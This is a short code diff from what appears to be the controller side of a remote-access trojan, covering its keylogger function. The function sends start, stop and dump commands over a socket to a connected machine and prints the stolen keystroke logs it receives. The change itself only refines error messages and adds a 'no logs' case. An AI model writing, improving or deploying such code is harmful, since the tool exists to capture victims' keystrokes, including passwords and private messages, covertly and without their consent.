@@ -381,21 +381,24 @@ def keylogger(option):
     if option == "start":
         conn.send(str.encode("keystart"))
         if decode_utf8(conn.recv(1024)) == "error":
-            print("Keylogger currently unavailable.")
+            print("Keylogger is already running.")
 
     elif option == "stop":
         conn.send(str.encode("keystop"))
+        if decode_utf8(conn.recv(1024)) == "error":
+            print("Keylogger is not running.")
 
     elif option == "dump":
         conn.send(str.encode("keydump"))
         intBuffer = decode_utf8(conn.recv(1024))
 
         if intBuffer == "error":
-            print("No logs or keylogger is not running.")
-            return
-
-        strLogs = decode_utf8(recvall(int(intBuffer)))  # get all data
-        print("\n" + strLogs)
+            print("Keylogger is not running.")
+        elif intBuffer == "error2":
+            print("No logs.")
+        else:
+            strLogs = decode_utf8(recvall(int(intBuffer)))  # get all data
+            print("\n" + strLogs)
 
 
 def send_command(command):
